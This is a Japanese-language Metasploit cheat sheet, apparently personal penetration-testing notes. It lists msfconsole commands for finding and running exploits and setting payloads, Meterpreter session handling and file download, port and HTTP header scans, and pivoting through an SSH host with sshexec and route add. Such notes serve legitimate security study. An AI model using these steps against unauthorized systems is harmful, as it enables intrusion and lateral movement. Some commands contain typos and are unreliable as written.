# Metasploit

## metasploit

- 起動

``` shell
metasploit
```

- バナーなし

``` shell
metasploit -q
```

- ファイルを読み込んで起動

``` shell
metasploit -r <.rcファイルのパス>
```

- ヘルプ

``` shell
help
```

- エクスプロイトの一覧

```shell
show exploit
```

- searchのヘルプ

``` shell
help search
```

- キーワード検索

``` shell
search <key word>
```

- ランク付き検索

``` shell
search <key word> rank:Excellent
```

- タイプ指定検索

``` shell
search type:exploit <keyword>
```

- エクスプロイトの指定

``` shell
use <exploit number / exploit_path>
```

- エクスプロイトの情報
  
``` shell
info <exploit_path>
```

- エクスプロイトの情報(エクスプロイト指定後)

``` shell
info
```

- オプション表示

``` shell
options
```

- オプション設定

``` shell
set <opyion> <value>
```

- 実行 違いはない

``` shell
exploit / run
```

- ペイロードの確認

``` shell
set payload
```

> msfconsoleから直接OSのコマンドも実行できる

## meterpreter

- セッションのバックグラウンド

``` shell
    background
```

- セッション一覧

``` shell
    sessions
```

- セッションをフォアグラウンドで実行

``` shell
    sessions -i <session ID>
```

- ファイルダウンロード

``` shell
    download
```

- ポートスキャン

``` shell
    use auxiliary/scanner/portscan/tcp
    #オプション設定
    set RHOSTS <target_ip_range> # XX.XX.XX.X-ZZ
    #this example is web port scan 
    set PORTS 80,443,8000,8080
    #実行
    run
```

- httpヘッダーの取得

``` shell
    #header情報
    use auxiliary/scanner/http/http_header
    #オプション設定
    set RHOST <target_ip>
    #実行
    run
```

## metasploitを使用したpivoting

- 前提条件
  - 踏み台にssh接続できること

``` shell
    # 起動
    msfconsole -q
    # 検索
    search sshexec
    # option設定
    use exploit/multi/ssh/sshexec
    set RHOSTS <pivot_ip_address>
    set USERNAME <pivot user_name>
    set PASSWORD <pivot_password>
    set LHOST <kali_port>
    # 実行
    eploit

    #meterpreterで実行
    #shellの実行
    shell
    #ネットワーク情報表示
    ifconfig
    #shellの終了
    exit
    #セッションをバックグラウンドに落とす
    background

    #metasploit
    #セッションの確認
    session
    #ルートの追加
    route add <target_ip_address> <target_subnet> <ssh_session_number>
    #ルートの確認
    route

```
